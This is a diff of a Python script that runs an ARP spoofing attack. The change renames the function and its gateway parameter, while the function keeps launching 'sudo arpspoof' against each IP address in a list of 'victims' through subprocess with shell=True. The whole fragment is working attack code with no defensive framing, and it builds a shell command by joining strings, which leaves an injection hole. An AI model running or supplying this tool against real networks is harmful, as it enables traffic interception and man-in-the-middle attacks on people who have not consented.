@@ -13,13 +13,13 @@ def stop_process(processes):
         p.terminate()
 
 
-def arp_poison(victims, router, interface):
+def arp_spoofing(victims, def_gateway, interface):
     """
     The function receives a list of IP addresses to be victims,
     Default gateway, and interface on which this network is connected,
     and implementing an ArpSpoofing attack
     :param victims: list of IP addresses to be victims.
-    :param router: Default gateway.
+    :param def_gateway: Default gateway.
     :param interface: interface on which this network is connected.
     :return:
     """
@@ -29,9 +29,10 @@ def arp_poison(victims, router, interface):
         # Get over on each victim IP
         for v in victims:
             # Indicates we get start to implement ArpSpoofing on the current victim:
-            print("starting to arpSpoof from " + router + " to " + v)
+            print("starting to arpSpoof from " + def_gateway + " to " + v)
             # Adding a child process that implementing the ArpSpoofing on the current victim:
-            processes.append(subprocess.Popen("sudo arpspoof " + router + " -i " + interface + " -t " + v, shell=True))
+            processes.append(
+                subprocess.Popen("sudo arpspoof " + def_gateway + " -i " + interface + " -t " + v, shell=True))
         time.sleep(100)
 
     except KeyboardInterrupt:
